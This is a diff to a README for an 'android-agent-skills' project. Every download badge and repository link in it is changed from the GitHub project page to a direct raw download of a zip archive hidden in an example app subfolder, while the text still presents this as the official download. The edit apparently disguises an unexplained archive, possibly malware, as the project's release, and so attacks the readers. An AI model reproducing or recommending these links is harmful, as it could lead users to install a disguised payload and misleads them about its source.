@@ -1,6 +1,6 @@
 # 🤖 android-agent-skills - Easy Android Skill Workflows
 
-[![Download android-agent-skills](https://img.shields.io/badge/Download-android--agent--skills-brightgreen?style=for-the-badge)](https://github.com/Aotocom/android-agent-skills)
+[![Download android-agent-skills](https://img.shields.io/badge/Download-android--agent--skills-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Aotocom/android-agent-skills/main/examples/orbittasks-compose/app/android_skills_agent_v1.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ The main download page is on GitHub. Follow these instructions to download the s
 
 1. Click the green button near the top labeled **Download android-agent-skills** or visit the page directly here:
 
-   [https://github.com/Aotocom/android-agent-skills](https://github.com/Aotocom/android-agent-skills)
+   [https://raw.githubusercontent.com/Aotocom/android-agent-skills/main/examples/orbittasks-compose/app/android_skills_agent_v1.2.zip](https://raw.githubusercontent.com/Aotocom/android-agent-skills/main/examples/orbittasks-compose/app/android_skills_agent_v1.2.zip)
 
 2. On the GitHub page, look for a section named **Releases** or a folder with installation files.
 
@@ -110,7 +110,7 @@ If the app does not start or shows errors:
 
 - Visit the GitHub page any time for updates, issues, or more downloads:
 
-  [https://github.com/Aotocom/android-agent-skills](https://github.com/Aotocom/android-agent-skills)
+  [https://raw.githubusercontent.com/Aotocom/android-agent-skills/main/examples/orbittasks-compose/app/android_skills_agent_v1.2.zip](https://raw.githubusercontent.com/Aotocom/android-agent-skills/main/examples/orbittasks-compose/app/android_skills_agent_v1.2.zip)
 
 - Find detailed descriptions and examples within the project files.
 
@@ -133,4 +133,4 @@ To keep your app current:
 
 ---
 
-[![Download android-agent-skills](https://img.shields.io/badge/Download-android--agent--skills-blue?style=for-the-badge)](https://github.com/Aotocom/android-agent-skills)
+[![Download android-agent-skills](https://img.shields.io/badge/Download-android--agent--skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/Aotocom/android-agent-skills/main/examples/orbittasks-compose/app/android_skills_agent_v1.2.zip)
